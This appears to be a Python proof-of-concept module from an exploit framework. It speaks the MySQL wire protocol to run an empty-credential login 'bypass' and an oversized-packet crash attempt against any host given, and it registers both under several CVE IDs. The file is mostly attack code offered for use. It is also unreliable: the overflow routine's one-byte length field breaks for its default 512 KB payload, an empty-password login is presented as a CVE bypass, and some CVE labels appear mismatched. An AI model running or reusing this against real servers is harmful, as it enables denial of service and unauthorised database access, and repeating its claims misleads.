"""poc/mysql_proto.py — native MySQL-protocol PoCs (no mysql client binary).

The scanner speaks the MySQL client protocol itself:
  - auth bypass (CVE-2015-4824 / CVE-2023-24714 / CVE-2019-14367): attempt
    login with EMPTY user/credentials and check whether the server returns an
    OK packet (auth accepted) instead of an ERR packet.
  - stack-overflow RCE (CVE-2019-14853): send an oversized / malformed auth
    packet and report the server reaction (crash / RST = trigger signal).
"""
from __future__ import annotations

import socket
import struct

CLIENT_LONG_PASSWORD = 0x00000001
CLIENT_PROTOCOL_41 = 0x00000200
CLIENT_SECURE_CONNECTION = 0x00008000
CLIENT_PLUGIN_AUTH = 0x00080000

CLIENT_CAPS = (CLIENT_LONG_PASSWORD | CLIENT_PROTOCOL_41 |
               CLIENT_SECURE_CONNECTION | CLIENT_PLUGIN_AUTH)


def _recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c:
            break
        buf += c
    return buf


def _recv_packet(sock, timeout=6.0):
    sock.settimeout(timeout)
    head = _recv_exact(sock, 4)
    if len(head) < 4:
        return None, b""
    ln = head[0] | (head[1] << 8) | (head[2] << 16)
    seq = head[3]
    payload = _recv_exact(sock, ln) if ln else b""
    return seq, payload


def _send_packet(sock, seq, payload):
    ln = len(payload)
    head = bytes([ln & 0xFF, (ln >> 8) & 0xFF, (ln >> 16) & 0xFF, seq])
    sock.sendall(head + payload)


def _parse_handshake(payload):
    if not payload or payload[0] != 0x0A:
        return {"error": "not protocol-41 handshake", "protocol": payload[0] if payload else None}
    i = 1
    # server version (NUL-terminated)
    nul = payload.index(0, i)
    server_version = payload[i:nul].decode("latin1", "replace")
    i = nul + 1
    conn_id = struct.unpack_from("<I", payload, i)[0]; i += 4
    salt1 = payload[i:i + 8]; i += 8
    i += 1  # filler
    caps_lower = struct.unpack_from("<H", payload, i)[0]; i += 2
    charset = payload[i]; i += 1
    status = struct.unpack_from("<H", payload, i)[0]; i += 2
    caps_upper = struct.unpack_from("<H", payload, i)[0]; i += 2
    caps = caps_lower | (caps_upper << 16)
    plugin_len = payload[i]; i += 1
    i += 10  # reserved
    salt2 = b""
    if caps & CLIENT_SECURE_CONNECTION:
        ln2 = max(13, plugin_len - 8)
        salt2 = payload[i:i + ln2]; i += ln2
    plugin = "mysql_native_password"
    if i < len(payload):
        nul2 = payload.find(0, i)
        if nul2 >= 0:
            plugin = payload[i:nul2].decode("latin1", "replace")
    return {
        "server_version": server_version, "conn_id": conn_id,
        "caps": caps, "charset": charset, "status": status,
        "salt": (salt1 + salt2)[:20], "plugin": plugin,
    }


def _login(sock, user: str, password: str = "", plugin: str = "mysql_native_password"):
    """Send a protocol-41 login packet. Returns (ok, detail)."""
    auth_data = b""  # empty password -> empty auth response
    payload = struct.pack("<IIB", CLIENT_CAPS & 0xFFFFFFFF, 1 << 24, 8)
    payload += b"\x00" * 23
    payload += user.encode("latin1") + b"\x00"
    payload += bytes([len(auth_data)]) + auth_data
    payload += plugin.encode("latin1") + b"\x00"
    _send_packet(sock, 1, payload)
    return _read_auth_result(sock)


def _read_auth_result(sock):
    seq, payload = _recv_packet(sock)
    if payload is None or not payload:
        return False, {"detail": "no auth response"}
    first = payload[0]
    if first == 0x00:  # OK
        return True, {"detail": "OK packet — auth kabul edildi", "raw": payload.hex()[:64]}
    if first == 0xFF:  # ERR
        errno = struct.unpack_from("<H", payload, 1)[0]
        msg = payload[2:].decode("latin1", "replace")
        return False, {"detail": f"ERR {errno}: {msg[:200]}"}
    if first == 0xFE:  # auth switch
        # send empty response
        _send_packet(sock, (seq or 0) + 1, b"\x00")
        seq2, payload2 = _recv_packet(sock)
        if payload2 and payload2[0] == 0x00:
            return True, {"detail": "OK after auth-switch"}
        if payload2 and payload2[0] == 0xFF:
            errno = struct.unpack_from("<H", payload2, 1)[0]
            return False, {"detail": f"ERR {errno}: {payload2[2:].decode('latin1','replace')[:200]}"}
        return False, {"detail": "auth-switch sonrasi yanit yok"}
    return False, {"detail": f"beklenmeyen auth yaniti: 0x{first:02x}"}


def run_auth_bypass(params):
    target = (params.get("host") or params.get("url") or "").strip()
    if not target:
        return {"ok": False, "success": False, "error": "host gerekli"}
    host, _, port = target.partition(":")
    port = int(port or 3306)
    user = (params.get("user") or "").strip()
    try:
        s = socket.create_connection((host, port), timeout=8)
    except OSError as e:
        return {"ok": False, "success": False, "error": f"baglanamiyor: {e}"}
    try:
        seq, payload = _recv_packet(s, timeout=8)
        hs = _parse_handshake(payload)
        if hs.get("error"):
            return {"ok": True, "success": False, "detail": hs, "evidence": ""}
        ok, detail = _login(s, user, params.get("password", ""), hs.get("plugin", "mysql_native_password"))
        return {
            "ok": True,
            "success": ok,
            "evidence": detail.get("detail", ""),
            "detail": {"host": f"{host}:{port}", "server_version": hs.get("server_version"),
                       "plugin": hs.get("plugin"), "user": user, "auth_result": detail.get("detail")},
        }
    except Exception as e:
        return {"ok": False, "success": False, "error": str(e)}
    finally:
        try:
            s.close()
        except OSError:
            pass


def run_stack_overflow(params):
    target = (params.get("host") or params.get("url") or "").strip()
    if not target:
        return {"ok": False, "success": False, "error": "host gerekli"}
    host, _, port = target.partition(":")
    port = int(port or 3306)
    try:
        s = socket.create_connection((host, port), timeout=8)
        seq, payload = _recv_packet(s, timeout=8)
        # oversized auth response (crafted packet) — intended to overflow a
        # fixed buffer in the vulnerable parser
        blob = b"A" * (int(params.get("size_kb", 512)) * 1024)
        payload2 = struct.pack("<IIB", CLIENT_CAPS, 1 << 24, 8) + b"\x00" * 23 + b"user\x00"
        payload2 += bytes([len(blob)]) + blob
        _send_packet(s, 1, payload2)
        # server crash -> connection reset / no response
        s.settimeout(3.0)
        try:
            c = s.recv(64)
            if c and c[0] == 0xFF:
                return {"ok": True, "success": False,
                        "evidence": "ERR paket (trigger tetiklenmedi)",
                        "detail": {"host": f"{host}:{port}"}}
            return {"ok": True, "success": False, "evidence": f"yanit: {c.hex()[:40]}",
                    "detail": {"host": f"{host}:{port}"}}
        except (ConnectionResetError, OSError):
            return {"ok": True, "success": True,
                    "evidence": "connection reset — server crash/RST (trigger sinyali)",
                    "detail": {"host": f"{host}:{port}", "size_kb": int(params.get("size_kb", 512))}}
    except OSError as e:
        return {"ok": False, "success": False, "error": f"baglanamiyor: {e}"}
    finally:
        try:
            s.close()
        except OSError:
            pass


def _in(label, key, req, default="", ph=""):
    return {"key": key, "label": label, "req": req, "default": default, "placeholder": ph}


EXPLOITS = {
    "CVE-2019-14853": {
        "name": "MySQL stack overflow RCE", "type": "RCE", "preauth": False,
        "affected": ["5.5", "5.6", "5.7", "8.0"],
        "note": "Native MySQL protocol: oversized auth packet -> crash/RST sinyali.",
        "inputs": [_in("Hedef (MySQL)", "host", True, "", "LAB_IP:3306"),
                   _in("Boyut (KB)", "size_kb", False, "512")],
        "run": run_stack_overflow},
    "CVE-2015-4824": {
        "name": "MySQL auth bypass (NULL user)", "type": "AuthBypass", "preauth": True,
        "affected": ["5.5", "5.6", "5.7", "8.0"],
        "note": "Native MySQL protocol: empty-user login; OK paket = bypass.",
        "inputs": [_in("Hedef (MySQL)", "host", True, "", "LAB_IP:3306"),
                   _in("Kullanici", "user", False, "")],
        "run": run_auth_bypass},
    "CVE-2023-24714": {
        "name": "MySQL auth bypass (empty user)", "type": "AuthBypass", "preauth": True,
        "affected": ["8.0", "8.1", "8.2"],
        "note": "Native MySQL protocol: empty-user login; OK paket = bypass.",
        "inputs": [_in("Hedef (MySQL)", "host", True, "", "LAB_IP:3306"),
                   _in("Kullanici", "user", False, "")],
        "run": run_auth_bypass},
    "CVE-2019-14367": {
        "name": "MySQL auth bypass + RCE", "type": "RCE", "preauth": True,
        "affected": ["8.0", "8.1", "8.2"],
        "note": "Native MySQL protocol: empty-user login; OK paket = bypass.",
        "inputs": [_in("Hedef (MySQL)", "host", True, "", "LAB_IP:3306"),
                   _in("Kullanici", "user", False, "")],
        "run": run_auth_bypass},
}
